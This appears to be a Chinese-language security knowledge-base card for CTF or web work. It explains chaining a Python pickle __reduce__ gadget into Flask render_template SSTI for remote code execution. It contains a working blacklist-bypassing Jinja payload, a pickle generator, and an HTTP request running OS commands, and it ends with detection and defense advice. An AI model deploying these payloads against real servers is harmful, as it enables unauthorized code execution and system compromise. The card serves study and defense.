---
id: web-python-deserialization-pickle-reduce-render-template-ssti
title: pickle __reduce__ 调 Flask render_template 把反序列化变成 SSTI：上传目录位于 template_folder，短 payload 同时绕长度与黑名单
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-reduce-render-template-ssti-pivot
aliases:
- pickle to SSTI
- pickle 打模板渲染
- __reduce__ render_template
- 模板目录上传
- lipsum request.data
- pickle 短 payload
- render_template gadget
tags:
- python
- pickle
- deserialization
- flask
- jinja2
- ssti
- render-template
- waf-bypass
- length-limit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V392
  verified_at: '2026-11-09T11:42:26+08:00'
  notes: 已对照原文全文与全部25图核对：app.template_folder='./' 与 uploads 重叠、waf 70 字节与黑名单（含换行/反斜杠/os/eval/exec/global/builtin/system 等）、lipsum 相邻字面量模板、pickle __reduce__=(render_template,('uploads/poc',))、伪造 admin session 后 GET pic.php?pic=exp 以请求体执行命令（图19-25 显示 whoami/ls/flag 回显）均一致。本机验证模板为 69 字节、protocol 4/5 pickle 实测 69 字节且不含黑名单子串（原卡 58–61 字节与模块名 flask 已修正为 69 字节/flask.templating）。与 INST os.system、eval+after_request、subprocess.run 黑名单绕过等既有 pickle 卡 gadget/sink 均不同，dedup related/new 成立。卡片 PoC 用 POST，原文实测为 GET 带 body，路由两者均支持。未在靶场复跑。frontmatter 无 sources/source_url/文章ID。
---

## 一句话结论

`pickle.load` 的 `__reduce__` 不必直接调 `os.system`/`eval`：当 Flask 应用把 `template_folder` 设为 `"./"`、而上传目录（如 `./uploads`）正好位于模板搜索路径下时，可以先上传一个 69 字节的 Jinja SSTI 模板，再上传一个 `__reduce__` 返回 `(flask.render_template, ("uploads/poc",))` 的短 pickle；服务端 `pickle.load` 时调用 `render_template` 渲染该模板，模板中 `{{lipsum['__glob''als__']['__built''ins__']['ev''al'](request.data)}}` 再 `eval` 请求体，得到任意代码执行——pickle 文件本身不含 `os`/`system`/`eval` 等黑名单词且长度受限也能通过。

## 原理

- **`__reduce__` 是任意可调用对象的分派器**：pickle 反序列化到 REDUCE opcode 时会执行 `callable(*args)`，`callable` 可以是任何能被 pickle 引用的模块级函数/类。常见链用 `os.system`、`eval`、`builtins.exec`，但这些名字往往被 WAF/长度限制拦截；换成一个业务上“正常”的渲染函数即可绕过特征。
- **`flask.render_template(name, **context)` 是理想 gadget**：它是模块级可导入函数，签名首参是模板名；pickle 里只需保存 `(flask.render_template, ("uploads/poc",))`。序列化流中出现的字符串只有模块名 `flask.templating`、函数名 `render_template` 和模板名 `uploads/poc`，均不含示例黑名单中的 `os`/`system`/`eval`/`exec`/`global`/`builtin`/`subprocess` 等子串。
- **模板路径恰好可达**：应用设置 `app.template_folder="./"`，Jinja 的 `FileSystemLoader` 以应用根目录为搜索路径；上传文件落在 `./uploads/poc`，因此模板名 `uploads/poc` 能直接命中上传的文件。正常情况下 template_folder 与上传目录分离，这一重叠把“任意文件上传”升级为“任意模板上传”。
- **SSTI 模板保持极短**：模板内容
  ```jinja
  {{lipsum['__glob''als__']['__built''ins__']['ev''al'](request.data)}}
  ```
  长度为 69 字节（低于示例 WAF 的 70 字节上限），且用 Jinja/Python 的相邻字符串字面量拼接把 `__globals__`、`__builtins__`、`eval` 拆开（`'__glob''als__'` 等），文件内容中不出现 `global`、`builtin`、`eval` 连续子串；`lipsum` 是 Jinja 默认全局函数，`request` 也是 Flask 注入模板的全局对象。
- **真正代码放在请求体**：模板 `eval(request.data)` 会把当前 HTTP 请求的 body 当 Python 代码执行；攻击者请求 `pic.php?pic=exp` 时，pickle 反序列化 → `render_template` → 模板渲染 → `eval(body)`，body 可以是任意长度的 `__import__('os').popen('...').read()`，不受 pickle/模板文件的长度限制。
- **序列化协议要点**：protocol 0/2/3 的 GLOBAL opcode 用 `c<module>\n<name>\n` 形式，含 `\n` 会被“禁换行”的 WAF 拦截；Python 3 默认的 protocol 4/5 用带长度前缀的二进制字符串，无换行/回车，且 `(flask.templating.render_template, ("uploads/poc",))` 序列化后为 69 字节（视模块名/模板名长度变化），恰好低于 70 字节限制。
- **为什么成立**：安全边界被错误地放在“pickle 数据里有没有危险函数名/是否够短”，而反序列化会调用应用自身的合法函数；渲染器再把攻击者可控的模板文件当代码执行。危险能力由两段合法功能组合产生，单看 pickle 或单看上传都像正常业务。

## 触发条件

- 存在对攻击者可控文件/数据的 `pickle.load`/`pickle.loads`（示例：管理员会话下读取 `./uploads/<file>`）。
- Flask `template_folder` 覆盖了攻击者可写的目录（如设为 `"./"`，上传目录 `./uploads` 在其下），或模板加载路径可用 `../` 到达上传目录。
- 攻击者能上传模板文件与 pickle 文件（文件内容受 WAF 限制，但可构造短串/相邻字面量绕过）。
- 渲染上下文包含可利用的 Jinja 全局（默认含 `lipsum`、`request`、`config`、`g` 等），且模板引擎未启用沙箱。
- 攻击者能触达 pickle 反序列化入口（示例需要 admin 会话，可用其他漏洞获得）。

## 利用步骤

1. 读源码确认三件事：`pickle.load` 的入口与权限、`template_folder` 的值、上传文件落盘路径；确认上传目录是否在模板搜索路径内。
2. 制作 SSTI 模板文件 `poc`：单行 69 字节 `{{lipsum['__glob''als__']['__built''ins__']['ev''al'](request.data)}}`，确认不含 WAF 黑名单子串、无换行/回车/反斜杠、长度低于限制。
3. 生成 pickle 文件 `exp`：
   ```python
   import pickle
   from flask import render_template
   class EXP:
       def __reduce__(self):
           return (render_template, ("uploads/poc",))
   pickle.dump(EXP(), open("exp", "wb"), protocol=4)
   ```
   检查序列化流不含禁用子串、长度 <70。
4. 通过上传接口依次上传 `poc` 与 `exp`。
5. 以具备反序列化权限的会话请求 `pic.php?pic=exp`，body 放要执行的 Python 代码（如 `__import__('os').popen('id').read()`）。
6. 响应中即为 `eval` 的返回值（`render_template` 的渲染结果）；命令执行成功后可按需反弹 shell 或写文件。
7. 若模板名需要扩展名，按目标 Jinja/Flask 版本调整模板文件名与 `render_template` 参数。

## PoC

```jinja
{{lipsum['__glob''als__']['__built''ins__']['ev''al'](request.data)}}
```

```python
# 生成 pickle gadget（protocol 4：无换行，短于 70 字节）
import pickle
from flask import render_template

class EXP:
    def __reduce__(self):
        return (render_template, ("uploads/poc",))

with open("exp", "wb") as f:
    pickle.dump(EXP(), f, protocol=4)
```

```http
POST /pic.php?pic=exp HTTP/1.1
Host: target
Cookie: session=<具备 admin 权限的会话>
Content-Type: text/plain

__import__('os').popen('id').read()
```

```text
服务端流程：
pickle.load(open("uploads/exp","rb"))
 → EXP.__reduce__ → render_template("uploads/poc")
 → Jinja 渲染上传的模板 → lipsum.__globals__.__builtins__.eval(request.data)
 → eval("__import__('os').popen('id').read()") → 结果写入响应
```

说明：以上为按原文链结构整理的结构化 PoC，未在本机执行；长度/黑名单数字以示例 WAF 为准，实际目标需按源码调整。

## 变体与关联

- **渲染器变体**：`jinja2.Template(...).render`、`flask.render_template_string`、Django `render`/`Template`、Mako `Template.render`；只要能被 pickle 引用且接受攻击者可控模板/参数即可。
- **模板位置变体**：template_folder 为默认 `templates` 时，可尝试路径穿越模板名（`../uploads/poc`）、符号链接或把文件写到 templates 目录；也可利用 Jinja loader 的其它搜索路径。
- **代码携带变体**：`request.data`、`request.args`、`request.form`、`request.headers` 均可作为 eval 的输入源；模板里也可用 `request.values` 等。
- **绕过变体**：相邻字面量、`\x5f` 转义、`|attr`、`dict|join` 拼关键字；模板长度限制可用短 global（`lipsum`/`cycler`/`g`）压缩。
- **关联**：[[web-python-deserialization-pickle-minimal-payload-under-length-limit]]（长度限制不构成防护、INST 最短串）；[[web-python-deserialization-flask-pickle-after-request-command-echo]]（`__reduce__` 走 eval + after_request 另一种回显）；[[web-python-ssti-jinja2-adjacent-literal-flask-session-forge]]（相邻字面量与 session 伪造）；[[web-python-ssti-str-format-double-format-dict-leak-flask-secret]]（同题前置的密钥泄露）。
- **边界**：template_folder 与上传目录不重叠、模板引擎启用沙箱、`render_template` 不可导入/被改名、pickle 使用 `RestrictedUnpickler` 类白名单、或 WAF 对二进制 pickle 做 AST/类名白名单校验时，本链失效。

## 检测与防御

- **反序列化层**：禁止对不可信数据 `pickle.load(s)`；必须用时使用 `RestrictedUnpickler` 显式类/函数白名单并校验 HMAC；把上传目录排除在任何可执行/可渲染路径之外。
- **模板层**：`template_folder` 只指向受控目录，禁止包含上传目录；使用 Jinja `SandboxedEnvironment`；不要把用户可写文件当模板渲染。
- **检测**：上传文件中出现 Jinja 表达式（即使拆字）、pickle 流含 `render_template`/`render_template_string` 等渲染函数、上传目录文件被 `render_template` 读取；随后同一会话请求 body 直接是 Python 代码的异常组合。
- **加固**：上传文件重命名为无扩展名并存储在 Web 根外；WAF 不只看关键字，需对 pickle 做类名白名单/签名校验；模板渲染与文件上传功能分离，最小权限运行。
